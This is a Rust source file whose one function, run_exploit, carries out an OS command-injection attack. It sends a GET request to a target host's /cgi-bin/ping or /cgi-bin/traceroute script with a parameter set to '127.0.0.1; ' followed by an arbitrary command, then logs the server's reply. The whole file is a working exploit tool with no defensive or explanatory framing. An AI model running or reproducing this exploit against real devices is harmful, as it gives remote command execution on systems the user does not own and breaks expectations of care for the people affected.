use anyhow::{Context, Result};
use std::time::Duration;

pub async fn run_exploit(target: &str, command: &str, use_traceroute: bool) -> Result<()> {
    let endpoint = if use_traceroute { "traceroute" } else { "ping" };
    let url = format!("http://{target}/cgi-bin/{endpoint}");
    let payload_param = if use_traceroute { "host" } else { "ip" };
    let payload = format!("127.0.0.1; {command}");

    tracing::info!("[*] Target: {url}");
    tracing::info!("[*] Payload: {payload_param}={payload}");

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .build()
        .context("create HTTP client")?;

    let resp = client
        .get(&url)
        .query(&[(payload_param, &payload)])
        .send()
        .await
        .context("send request")?;

    tracing::info!("[*] HTTP Status Code: {}", resp.status());

    if resp.status().is_success() {
        let body = resp.text().await?;
        tracing::info!("\n--- Response ---\n{body}\n----------------");
    } else {
        tracing::warn!("[!] Request failed with status code: {}", resp.status());
    }

    Ok(())
}
